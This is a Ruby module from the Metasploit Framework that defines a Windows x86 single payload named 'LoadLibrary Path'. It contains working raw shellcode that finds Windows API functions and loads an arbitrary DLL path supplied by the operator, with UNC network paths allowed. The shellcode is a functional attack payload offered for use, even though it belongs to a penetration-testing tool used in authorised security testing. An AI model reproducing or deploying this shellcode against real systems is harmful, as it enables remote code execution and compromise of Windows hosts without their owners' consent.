# -*- coding: binary -*-

module Msf

###
#
# Common loadlibrary implementation for Windows.
#
###

module Payload::Windows::LoadLibrary

	include Msf::Payload::Windows
	include Msf::Payload::Single

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows LoadLibrary Path',
			'Version'       => '$Revision$',
			'Description'   => 'Load an arbitrary library path',
			'Author'        => [ 'sf', 'hdm' ],
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'PayloadCompat' =>
				{
					'Convention' => '-http -https',
				},
			'Payload'       =>
				{
					'Offsets' =>
						{
							'EXITFUNC' => [ 159, 'V' ]
						},
					'Payload' =>
						"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
						"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
						"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
						"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
						"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
						"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
						"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
						"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
						"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
						"\x8D\x85\xB7\x00\x00\x00\x50\x68\x4C\x77\x26\x07\xFF\xD5\xBB\xE0" +
						"\x1D\x2A\x0A\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB" +
						"\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5"
				}
			))

		# Register command execution options
		register_options(
			[
				OptString.new('DLL', [ true, "The library path to load (UNC is OK)" ]),
			], self.class)
	end

	#
	# Constructs the payload
	#
	def generate
		return super + dll_string + "\x00"
	end

	#
	# Returns the command string to use for execution
	#
	def dll_string
		return datastore['DLL'] || ''
	end

end

end

